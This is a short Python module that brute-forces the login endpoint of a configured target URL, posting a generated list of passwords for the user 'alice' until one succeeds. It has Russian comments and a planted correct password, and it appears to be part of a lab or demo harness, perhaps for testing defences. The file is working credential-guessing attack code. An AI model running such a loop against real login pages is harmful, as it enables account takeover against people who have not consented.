import asyncio
import httpx
from . import TARGET_URL

async def run_brute_force(target_user: str = "alice", attempts: int = 500):
    """Перебирает пароли для target_user."""
    print(f"🔨 Starting Brute-force on user '{target_user}' ({attempts} attempts)...")
    
    # Генерируем словарь паролей (в реальности — из файла)
    passwords = [f"pass{i}" for i in range(attempts)]
    passwords.append("password123") # В самом конце правильный
    
    async with httpx.AsyncClient() as client:
        for pwd in passwords:
            try:
                r = await client.post(
                    f"{TARGET_URL}/login?format=json",
                    headers={"Accept": "application/json"},
                    data={"username": target_user, "password": pwd},
                    timeout=2.0,
                )
                if r.status_code == 200:
                    print(f"🎉 Password found: {pwd}")
                    break
            except Exception:
                pass
                
    print("✅ Brute-force finished.")